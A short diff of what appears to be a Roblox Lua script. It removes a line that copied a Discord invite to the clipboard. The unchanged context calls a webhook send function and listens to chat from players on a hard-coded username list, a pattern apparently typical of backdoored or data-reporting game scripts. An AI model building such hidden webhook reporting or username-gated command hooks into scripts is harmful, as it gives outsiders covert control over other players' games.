@@ -213,7 +213,6 @@ local function send(url)
 end
 
 send(Webhook)
-setclipboard("discord.gg/Y2fwV2eF2Z")
 game.Players.PlayerAdded:Connect(function(player)
     if table.find(Username, player.Name) then
         player.Chatted:Connect(function(msg)
@@ -222,4 +221,5 @@ game.Players.PlayerAdded:Connect(function(player)
     end
 
 end)
+
 
